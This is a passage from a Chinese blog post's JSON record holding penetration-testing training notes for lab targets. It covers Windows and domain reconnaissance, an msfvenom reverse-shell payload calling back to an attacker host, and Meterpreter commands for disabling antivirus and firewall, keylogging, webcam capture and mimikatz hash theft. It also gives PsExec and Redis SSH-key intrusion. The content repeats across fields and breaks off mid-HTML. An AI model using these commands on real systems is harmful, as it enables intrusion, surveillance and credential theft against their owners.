8000\n```\n\nmsf攻击windows靶机，假设靶机拥有`MS17-010`漏洞：\n\nwin7使用`exploit/windows/smb/ms17_010_eternalblue`比较稳定，win2012及以上使用`exploit/windows/smb/ms17_010_psexec`较稳定。\n\n[msf下MS17-010模块使用总结](https://blog.csdn.net/qq_43645782/article/details/106870256)","source":"_posts/2024/06/攻防技术笔记.md","raw":"---\ntitle: 2024网络安全攻防技术培训\ndate: 2024-06-25 09:00:00\ntags:\n  - 培训\n  - 网络安全\ncategories:\n  - 培训\n  - 网络安全\n---\n\n2024网络安全攻防技术培训部分笔记\n\n<!-- more -->\n\n# Windows信息收集\n\n```bash\n# windows信息收集\n ipconfig /all   # 查看本机ip，所在域\n route print     # 打印路由信息\n net view        # 查看局域网内其他主机名\n arp -a          # 查看arp缓存\n net start       # 查看开启了哪些服务\n net share       # 查看开启了哪些共享\n net share ipc$  # 开启ipc共享\n net share c$    # 开启c盘共享\n net use \\\\192.168.xx.xx\\ipc$ \"\" /user:\"\"    # 与192.168.xx.xx建立空连接\n net use \\\\192.168.xx.xx\\c$ \"密码\" /user:\"用户名\"    # 建立c盘共享\n dir \\\\192.168.xx.xx\\c$\\user    # 查看192.168.xx.xx c盘user目录下的文件\n\n# 域信息收集\n net config Workstation    # 查看计算机名、全名、用户名、系统版本、工作站、域、登录域\n net user                 # 查看本机用户列表\n net user /domain         # 查看域用户\n net localgroup administrators    # 查看本地管理员组（通常会有域用户）\n net view /domain         # 查看有几个域\n net user 用户名 /domain   # 获取指定域用户的信息\n net group /domain        # 查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）\n net group 组名 /domain    # 查看域中某工作组\n net group \"domain admins\" /domain  # 查看域管理员的名字\n net group \"domain computers\" /domain  # 查看域中的其他主机名\n net group \"doamin controllers\" /domain  # 查看域控制器（可能有多台）\n\n# 添加用户\n net user xx xxxx /add      # 添加用户\n net localgroup administrators xx /add  # 添加用户到域\n```\n\n使用Metasploit生成反弹shell后门程序，上传靶机执行，上线后抓取口令。\n\n[Metasploit (MSF) 使用:包含基本使用、payload生成、后渗透模块使用](https://blog.csdn.net/x319427393/article/details/129366648)\n\n```bash\nmsfconsole\n\n# msf6 >\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.24.31.172 LPORT=5353 -f exe > shell.exe   # 生成反传程序\n\nuse exploit/multi/handler\n\n# msf6 exploit(multi/handler) >\nset payload windows/meterpreter/reverse_tcp   # 设置payload\n\nshow options # 查看配置\n\nset lhost 172.24.31.172     # 配置lhost，lport配置同理\n\nexploit # 监听反传，需要先将前面生成的反传程序在靶机运行\n```\n\n成功劫持后常用模块：\n\n```bash\n1、获取系统运行平台: sysinfo\n2、提取系统信息: run scraper\n3、查看进行: ps\n4、迁移进行: migrate 1774\n5、查看文件: cat 文件\n6、查看当前路径: pwd\n7、搜索文件: search -d c:\\\\ -f *.doc\n8、其他命令类似于Linux命令: cd, rm, mkdir, rmdir, dir, mv等等\n9、上传文件: upload 本机路径 上传目标路径\n10、下载文件: download 目标路径 本机路径\n11、进程迁移: run post/windows/manage/migrate\n12、关闭杀软: run post/windows/manage/killav\n13、通过shell来关闭防火墙: netsh advfirewall set allprofiles state off \n14、截屏: screenshot\n15、查看桌面: run vnc\n16、开启3389: run post/windows/manage/enable_rdp\n17、提权模块: mult/recon/local_exploit_suggester 设置过去的session ID\n\t\t\t\t 执行之后会返回可以提权的模块，然后进行调用，设置session提权，成功会返回新的会话\n18、运行程序: execute -f notepad.exe 加H可以进行隐藏运行\n19、摄像头命令:\n\t\t\t\t\t音频录制: record_mic\n\t\t\t\t\t查看摄像头接口: webcam_chat\n\t\t\t\t\t查看摄像头列表: webcam_list\n\t\t\t\t\t摄像头视频获取: webcam_stream\n20、端口转发: 作用如果目标机器在内网开放3389，外网无法连接，这个时候进行端口转发，利用会话将目标机器3389转发到本地，实现3389远程连接\n\t\t\t\t\t-L: 要监听的本地主机ip（可选）\n\t\t\t\t\t-h: 帮助\n\t\t\t\t\t-l: 要监听的本地端口\n\t\t\t\t\t-p: 要连接到的远程端口\n\t\t\t\t\t-r: 要连接的远程主机ip\n\t\t\t\t\tportfwd add -l 4444 -p 3389 -r 10.211.55.7 // 把目标机10.211.55.7的3389端口转发到本机127.0.0.1的4444端口，直接进行连接本机4444端口即可3389远程连接，同样如果本地两台电脑，另一台电脑直接远程访问开启4444主机的IP+4444可以直接进行连接，，，，注意端口转发并不需要高权限上线就可以直接转发。\n21、键盘记录:\n\t\t\t\tkeyscan_start: 开启键盘记录功能\n\t\t\t\tkeyscan_dump: 显示捕捉的键盘记录信息\n\t\t\t\tkeyscan_stop: 停止键盘记录\n21、获取hash值: load mimikatz（32位）load kivi（64位）此时调用完成就直接可以使用该模块的命令，但是使用该命令需要拥有系统system权限，同样也可以使用hashdump导出\n22、盗取身份令牌: use incognito\n\t\t\t\t\tlist_tokens -u: 列出目标主机用户组可用的令牌，有的话可以直接进行身份切换\n\t\t\t\t\tlist_tokens -g: 列出目标主机用户组可用的令牌，有的话可以直接进行身份切换\n\t\t\t\t\timpersonate_token LUCKYXBDC6\\luckyx: 切换令牌身份\n```\n\n使用微软PsExec工具连接服务器cmd，控制域控。\n\n[【渗透测试笔记】之【内网渗透——横向移动：PsExec的使用】](https://blog.csdn.net/qq_44874645/article/details/121394678)\n\n```bash\nPsExec64.exe /accepteula /s \\\\192.168.52.138 -u Administrator -p 12345@QwerT cmd\n```\n\n# 内网穿透\n\n工具：\n\n- ew\n- frp\n- nps\n- metasploit\n- CobalStrike\n\n# 尝试\n\nfscan 扫描端口与服务。\n\n比如扫出 cve 漏洞，搜索如何利用漏洞攻击；redis未授权漏洞中 `/root/.ssh/` 可写的话可直接上传公钥连接ssh。\n\n- 通过redis备份方式写入\n\n[Redis未授权访问写Webshell和公私钥认证获取root权限](https://www.cnblogs.com/-qing-/p/10978912.html)\n\n- 通过fscan写入redis文件\n\n```bash\nfscan -h 172.24.31.169 -rf /home/kali/.ssh/id_rsa.pub\n\nssh -i id_rsa root@172.24.31.169\n```\n\n注：使用python开启web下载服务器\n\n```bash\n# python2 开启web下载服务器（后台有日志）\nnohup python -u -m SimpleHTTPServer > download.log 2>&1 &\n\n# python3 开启web下载服务器\npython -m http.server 8000\n```\n\nmsf攻击windows靶机，假设靶机拥有`MS17-010`漏洞：\n\nwin7使用`exploit/windows/smb/ms17_010_eternalblue`比较稳定，win2012及以上使用`exploit/windows/smb/ms17_010_psexec`较稳定。\n\n[msf下MS17-010模块使用总结](https://blog.csdn.net/qq_43645782/article/details/106870256)","slug":"2024/06/攻防技术笔记","published":1,"updated":"2024-07-11T10:05:06.590Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clyh3xcj8003rzge390484mao","content":"<p>2024网络安全攻防技术培训部分笔记</p>\n<span id=\"more\"></span>\n\n<h1 id=\"Windows信息收集\"><a href=\"#Windows信息收集\" class=\"headerlink\" title=\"Windows信息收集\"></a>Windows信息收集</h1><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># windows信息收集</span></span><br><span class=\"line\"> ipconfig /all   <span class=\"comment\"># 查看本机ip，所在域</span></span><br><span class=\"line\"> route <span class=\"built_in\">print</span>     <span class=\"comment\"># 打印路由信息</span></span><br><span class=\"line\"> net view        <span class=\"comment\"># 查看局域网内其他主机名</span></span><br><span class=\"line\"> arp -a          <span class=\"comment\"># 查看arp缓存</span></span><br><span class=\"line\"> net start       <span class=\"comment\"># 查看开启了哪些服务</span></span><br><span class=\"line\"> net share       <span class=\"comment\"># 查看开启了哪些共享</span></span><br><span class=\"line\"> net share ipc$  <span class=\"comment\"># 开启ipc共享</span></span><br><span class=\"line\"> net share c$    <span class=\"comment\"># 开启c盘共享</span></span><br><span class=\"line\"> net use \\\\192.168.xx.xx\\ipc$ <span class=\"string\">&quot;&quot;</span> /user:<span class=\"string\">&quot;&quot;</span>    <span class=\"comment\"># 与192.168.xx.xx建立空连接</span></span><br><span class=\"line\"> net use \\\\192.168.xx.xx\\c$ <span class=\"string\">&quot;密码&quot;</span> /user:<span class=\"string\">&quot;用户名&quot;</span>    <span class=\"comment\"># 建立c盘共享</span></span><br><span class=\"line\"> <span class=\"built_in\">dir</span> \\\\192.168.xx.xx\\c$\\user    <span class=\"comment\"># 查看192.168.xx.xx c盘user目录下的文件</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 域信息收集</span></span><br><span class=\"line\"> net config Workstation    <span class=\"comment\"># 查看计算机名、全名、用户名、系统版本、工作站、域、登录域</span></span><br><span class=\"line\"> net user                 <span class=\"comment\"># 查看本机用户列表</span></span><br><span class=\"line\"> net user /domain         <span class=\"comment\"># 查看域用户</span></span><br><span class=\"line\"> net localgroup administrators    <span class=\"comment\"># 查看本地管理员组（通常会有域用户）</span></span><br><span class=\"line\"> net view /domain         <span class=\"comment\"># 查看有几个域</span></span><br><span class=\"line\"> net user 用户名 /domain   <span class=\"comment\"># 获取指定域用户的信息</span></span><br><span class=\"line\"> net group /domain        <span class=\"comment\"># 查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）</span></span><br><span class=\"line\"> net group 组名 /domain    <span class=\"comment\"># 查看域中某工作组</span></span><br><span class=\"line\"> net group <span class=\"string\">&quot;domain admins&quot;</span> /domain  <span class=\"comment\"># 查看域管理员的名字</span></span><br><span class=\"line\"> net group <span class=\"string\">&quot;domain computers&quot;</span> /domain  <span class=\"comment\"># 查看域中的其他主机名</span></span><br><span class=\"line\"> net group <span class=\"string\">&quot;doamin controllers&quot;</span> /domain  <span class=\"comment\"># 查看域控制器（可能有多台）</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 添加用户</span></span><br><span class=\"line\"> net user xx xxxx /add      <span class=\"comment\"># 添加用户</span></span><br><span class=\"line\"> net localgroup administrators xx /add  <span class=\"comment\"># 添加用户到域</span></span><br></pre></td></tr></table></figure>\n\n<p>使用Metasploit生成反弹shell后门程序，上传靶机执行，上线后抓取口令。</p>\n<p><a href=\"https://blog.csdn.net/x319427393/article/details/129366648\">Metasploit (MSF) 使用:包含基本使用、payload生成、后渗透模块使用</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msfconsole</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># msf6 &gt;</span></span><br><span class=\"line\">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.24.31.172 LPORT=5353 -f exe &gt; shell.exe   <span class=\"comment\"># 生成反传程序</span></span><br><span class=\"line\"></span><br><span class=\"line\">use exploit/multi/handler</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># msf6 exploit(multi/handler) &gt;</span></span><br><span class=\"line\"><span class=\"built_in\">set</span> payload windows/meterpreter/reverse_tcp   <span class=\"comment\"># 设置payload</span></span><br><span class=\"line\"></span><br><span class=\"line\">show options <span class=\"comment\"># 查看配置</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">set</span> lhost 172.24.31.172     <span class=\"comment\"># 配置lhost，lport配置同理</span></span><br><span class=\"line\"></span><br><span class=\"line\">exploit <span class=\"comment\"># 监听反传，需要先将前面生成的反传程序在靶机运行</span></span><br></pre></td></tr></table></figure>\n\n<p>成功劫持后常用模块：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1、获取系统运行平台: sysinfo</span><br><span class=\"line\">2、提取系统信息: run scraper</span><br><span class=\"line\">3、查看进行: ps</span><br><span class=\"line\">4、迁移进行: migrate 1774</span><br><span class=\"line\">5、查看文件: <span class=\"built_in\">cat</span> 文件</span><br><span class=\"line\">6、查看当前路径: <span class=\"built_in\">pwd</span></span><br><span class=\"line\">7、搜索文件: search -d c:\\\\ -f *.doc</span><br><span class=\"line\">8、其他命令类似于Linux命令: <span class=\"built_in\">cd</span>, <span class=\"built_in\">rm</span>, <span class=\"built_in\">mkdir</span>, <span class=\"built_in\">rmdir</span>, <span class=\"built_in\">dir</span>, <span class=\"built_in\">mv</span>等等</span><br><span class=\"line\">9、上传文件: upload 本机路径 上传目标路径</span><br><span class=\"line\">10、下载文件: download 目标路径 本机路径</span><br><span class=\"line\">11、进程迁移: run post/windows/manage/migrate</span><br><span class=\"line\">12、关闭杀软: run post/windows/manage/killav</span><br><span class=\"line\">13、通过shell来关闭防火墙: netsh advfirewall <span class=\"built_in\">set</span> allprofiles state off </span><br><span class=\"line\">14、截屏: screenshot</span><br><span class=\"line\">15、查看桌面: run vnc</span><br><span class=\"line\">16、开启3389: run post/windows/manage/enable_rdp</span><br><span class=\"line\">17、提权模块: mult/recon/local_exploit_suggester 设置过去的session ID</span><br><span class=\"line\">\t\t\t\t 执行之后会返回可以提权的模块，然后进行调用，设置session提权，成功会返回新的会话</span><br><span class=\"line\">18、运行程序: execute -f notepad.exe 加H可以进行隐藏运行</span><br><span class=\"line\">19、摄像头命令:</span><br><span class=\"line\">\t\t\t\t\t音频录制: record_mic</span><br><span class=\"line\">\t\t\t\t\t查看摄像头接口: webcam_chat</span><br><span class=\"line\">\t\t\t\t\t查看摄像头列表: webcam_list</span><br><span class=\"line\">\t\t\t\t\t摄像头视频获取: webcam_stream</span><br><span class=\"line\">20、端口转发: 作用如果目标机器在内网开放3389，外网无法连接，这个时候进行端口转发，利用会话将目标机器3389转发到本地，实现3389远程连接</span><br><span class=\"line\">\t\t\t\t\t-L: 要监听的本地主机ip（可选）</span><br><span class=\"line\">\t\t\t\t\t-h: 帮助</span><br><span class=\"line\">\t\t\t\t\t-l: 要监听的本地端口</span><br><span class=\"line\">\t\t\t\t\t-p: 要连接到的远程端口</span><br><span class=\"line\">\t\t\t\t\t-r: 要连接的远程主机ip</span><br><span class=\"line\">\t\t\t\t\tportfwd add -l 4444 -p 3389 -r 10.211.55.7 // 把目标机10.211.55.7的3389端口转发到本机127.0.0.1的4444端口，直接进行连接本机4444端口即可3389远程连接，同样如果本地两台电脑，另一台电脑直接远程访问开启4444主机的IP+4444可以直接进行连接，，，，注意端口转发并不需要高权限上线就可以直接转发。</span><br><span class=\"line\">21、键盘记录:</span><br><span class=\"line\">\t\t\t\tkeyscan_start: 开启键盘记录功能</span><br><span class=\"line\">\t\t\t\tkeyscan_dump: 显示捕捉的键盘记录信息</span><br><span class=\"line\">\t\t\t\tkeyscan_stop: 停止键盘记录</span><br><span class=\"line\">21、获取<span class=\"built_in\">hash</span>值: load mimikatz（32位）load kivi（64位）此时调用完成就直接可以使用该模块的命令，但是使用该命令需要拥有系统system权限，同样也可以使用hashdump导出</span><br><span class=\"line\">22、盗取身份令牌: use incognito</span><br><span class=\"line\">\t\t\t\t\tlist_tokens -u: 列出目标主机用户组可用的令牌，有的话可以直接进行身份切换</span><br><span class=\"line\">\t\t\t\t\tlist_tokens -g: 列出目标主机用户组可用的令牌，有的话可以直接进行身份切换</span><br><span class=\"line\">\t\t\t\t\timpersonate_token LUCKYXBDC6\\luckyx: 切换令牌身份</span><br></pre></td></tr></table></figure>\n\n<p>使用微软PsExec工具连接服务器cmd，控制域控。</p>\n<p><a href=\"https://blog.csdn.net/qq_44874645/article/details/121394678\">【渗透测试笔记】之【内网渗透——横向移动：PsExec的使用】</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PsExec64.exe /accepteula /s \\\\192.168.52.138 -u Administrator -p 12345@QwerT cmd</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"内网穿透\"><a href=\"#内网穿透\" class=\"headerlink\" title=\"内网穿透\"></a>内网穿透</h1><p>工具：</p>\n<ul>\n<li>ew</li>\n<li>frp</li>\n<li>nps</li>\n<li>metasploit</li>\n<li>CobalStrike</li>\n</ul>\n<h1 id=\"尝试\"><a href=\"#尝试\" class=\"headerlink\" title=\"尝试\"></a>尝试</h1><p>fscan 扫描端口与服务。</p>\n<p>比如扫出 cve 漏洞，搜索如何利用漏洞攻击；redis未授权漏洞中 <code>/root/.ssh/</code> 可写的话可直接上传公钥连接ssh。</p>\n<ul>\n<li>通过redis备份方式写入</li>\n</ul>\n<p><a href=\"https://www.cnblogs.com/-qing-/p/10978912.html\">Redis未授权访问写Webshell和公私钥认证获取root权限</a></p>\n<ul>\n<li>通过fscan写入redis文件</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fscan -h 172.24.31.169 -rf /home/kali/.ssh/id_rsa.pub</span><br><span class=\"line\"></span><br><span class=\"line\">ssh -i id_rsa root@172.24.31.169</span><br></pre></td></tr></table></figure>\n\n<p>注：使用python开启web下载服务器</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># python2 开启web下载服务器（后台有日志）</span></span><br><span class=\"line\"><span class=\"built_in\">nohup</span> python -u -m SimpleHTTPServer &gt; download.log 2&gt;&amp;1 &amp;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># python3 开启web下载服务器</span></span><br><span class=\"line\">python -m http.server 8000</span><br></pre></td></tr></table></figure>\n\n<p>msf攻击windows靶机，假设靶机拥有<code>MS17-010</code>漏洞：</p>\n<p>win7使用<code>exploit/windows/smb/ms17_010_eternalblue</code>比较稳定，win2012及以上使用<code>exploit/windows/smb/ms17_010_psexec</code>较稳定。</p>\n<p><a href=\"https://blog.csdn.net/qq_43645782/article/details/106870256\">msf下MS17-010模块使用总结</a></p>\n","site":{"data":{}},"excerpt":"<p>2024网络安全攻防技术培训部分笔记</p>","more":"<h1 id=\"Windows信息收集\"><a href=\"#Windows信息收集\" class=\"headerlink\" title=\"Windows信息收集\"></a>Windows信息收集</h1><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># windows信息收集</span></span><br><span class=\"line\"> ipconfig /all   <span class=\"comment\"># 查看本机ip，所在域</span></span><br><span class=\"line\"> route <span class=\"built_in\">print</span>     <span class=\"comment\"># 打印路由信息</span></span><br><span class=\"line\"> net view        <span class=\"comment\"># 查看局域网内其他主机名</span></span><br><span class=\"line\"> arp -a          <span class=\"comment\"># 查看arp缓存</span></span><br><span class=\"line\"> net start       <span class=\"comment\"># 查看开启了哪些服务</span></span><br><span class=\"line\"> net share       <span class=\"comment\"># 查看开启了哪些共享</span></span><br><span class=\"line\"> net share ipc$  <span class=\"comment\"># 开启ipc共享</span></span><br><span class=\"line\"> net share c$    <span class=\"comment\"># 开启c盘共享</span></span><br><span class=\"line\"> net use \\\\192.168.xx.xx\\ipc$ <span class=\"string\">&quot;&quot;</span> /user:<span class=\"string\">&quot;&quot;</span>    <span class=\"comment\"># 与192.168.xx.xx建立空连接</span></span><br><span class=\"line\"> net use \\\\192.168.xx.xx\\c$ <span class=\"string\">&quot;密码&quot;</span> /user:<span class=\"string\">&quot;用户名&quot;</span>    <span class=\"comment\"># 建立c盘共享</span></span><br><span class=\"line\"> <span class=\"built_in\">dir</span> \\\\192.168.xx.xx\\c$\\user    <span class=\"comment\"># 查看192.168.xx.xx c盘user目录下的文件</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 域信息收集</span></span><br><span class=\"line\"> net config Workstation    <span class=\"comment\"># 查看计算机名、全名、用户名、系统版本、工作站、域、登录域</span></span><br><span class=\"line\"> net user                 <span class=\"comment\"># 查看本机用户列表</span></span><br><span class=\"line\"> net user /domain         <span class=\"comment\"># 查看域用户</span></span><br><span class=\"line\"> net localgroup administrators    <span class=\"comment\"># 查看本地管理员组（通常会有域用户）</span></span><br><span class=\"line\"> net view /domain         <span class=\"comment\"># 查看有几个域</span></span><br><span class=\"line\"> net user 用户名 /domain   <span class=\"comment\"># 获取指定域用户的信息</span></span><br><span class=\"line\"> net group /domain        <span class=\"comment\"># 查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）</span></span><br><span class=\"line\"> net group 组名 /domain    <span class=\"comment\"># 查看域中某工作组</span></span><br><span class=\"line\"> net group <span class=\"string\">&quot;domain admins&quot;</span> /domain  <span class=\"comment\"># 查看域管理员的名字</span></span><br><span class=\"line\"> net group <span class=\"string\">&quot;domain computers&quot;</span> /domain  <span class=\"comment\"># 查看域中的其他主机名</span></span><br><span class=\"line\"> net group <span class=\"string\">&quot;doamin controllers&quot;</span> /domain  <span class=\"comment\"># 查看域控制器（可能有多台）</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 添加用户</span></span><br><span class=\"line\"> net user xx xxxx /add      <span class=\"comment\"># 添加用户</span></span><br><span class=\"line\"> net localgroup administrators xx /add  <span class=\"comment\"># 添加用户到域</span></span><br></pre></td></tr></table></figure>\n\n<p>使用Metasploit生成反弹shell后门程序，上传靶机执行，上线后抓取口令。</p>\n<p><a href=\"https://blog.csdn.net/x319427393/article/details/129366648\">Metasploit (MSF) 使用:包含基本使用、payload生成、后渗透模块使用</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msfconsole</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># msf6 &gt;</span></span><br><span class=\"line\">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.24.31.172 LPORT=5353 -f exe &gt; shell.exe   <span class=\"comment\"># 生成反传程序</span></span><br><span class=\"line\"></span><br><span class=\"line\">use exploit/multi/handler</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># msf6 exploit(multi/handler) &gt;</span></span><br><span class=\"line\"><span class=\"built_in\">set</span> payload windows/meterpreter/reverse_tcp   <span class=\"comment\"># 设置payload</span></span><br><span class=\"line\"></span><br><span class=\"line\">show options <span class=\"comment\"># 查看配置</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">set</span> lhost 172.24.31.172     <span class=\"comment\"># 配置lhost，lport配置同理</span></span><br><span class=\"line\"></span><br><span class=\"line\">exploit <span class=\"comment\"># 监听反传，需要先将前面生成的反传程序在靶机运行</span></span><br></pre></td></tr></table></figure>\n\n<p>成功劫持后常用模块：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1、获取系统运行平台: sysinfo</span><br><span class=\"line\">2、提取系统信息: run scraper</span><br><span class=\"line\">3、查看进行: ps</span><br><span class=\"line\">4、迁移进行: migrate 1774</span><br><span class=\"line\">5、查看文件: <span class=\"built_in\">cat</span> 文件</span><br><span class=\"line\">6、查看当前路径: <span class=\"built_in\">pwd</span></span><br><span class=\"line\">7、搜索文件: search -d c:\\\\ -f *.doc</span><br><span class=\"line\">8、其他命令类似于Linux命令: <span class=\"built_in\">cd</span>, <span class=\"built_in\">rm</span>, <span class=\"built_in\">mkdir</span>, <span class=\"built_in\">rmdir</span>, <span class=\"built_in\">dir</span>, <span class=\"built_in\">mv</span>等等</span><br><span class=\"line\">9、上传文件: upload 本机路径 上传目标路径</span><br><span class=\"line\">10、下载文件: download 目标路径 本机路径</span><br><span class=\"line\">11、进程迁移: run post/windows/manage/migrate</span><br><span class=\"line\">12、关闭杀软: run post/windows/manage/killav</span><br><span class=\"line\">13、通过shell来关闭防火墙: netsh advfirewall <span class=\"built_in\">set</span> allprofiles state off </span><br><span class=\"line\">14、截屏: screenshot</span><br><span class=\"line\">15、查看桌面: run vnc</span><br><span class=\"line\">16、开启3389: run post/windows/manage/enable_rdp</span><br><span class=\"line\">17、提权模块: mult/recon/local_exploit_suggester 设置过去的session ID</span><br><span class=\"line\">\t\t\t\t 执行之后会返回可以提权的模块，然后进行调用，设置session提权，成功会返回新的会话</span><br><span class=\"line\">18、运行程序: execute -f notepad.exe 加H可以进行隐藏运行</span><br><span class=\"line\">19、摄像头命令:</span><br><span class=\"line\">\t\t\t\t\t音频录制: record_mic</span><br><span class=\"line\">\t\t\t\t\t查看摄像头接口: webcam_chat</span><br><span class=\"line\">\t\t\t\t\t查看摄像头列表: webcam_list</span><br><span class=\"line\">\t\t\t\t\t摄像头视频获取: webcam_stream</span><br><span class=\"line\">20、端口转发: 作用如果目标机器在内网开放3389，外网无法连接，这个时候进行端口转发，利用会话将目标机器3389转发到本地，实现3389远程连接</span><br><span class=\"line\">\t\t\t\t\t-L: 要监听的本地主机ip（可选）</span><br><span class=\"line\">\t\t\t\t\t-h: 帮助</span><br><span class=\"line\">\t\t\t\t\t-l: 要监听的本地端口</span><br><span class=\"line\">\t\t\t\t\t-p: 要连接到的远程端口</span><br><span class=\"line\">\t\t\t\t\t-r: 要连接的远程主机ip</span><br><span 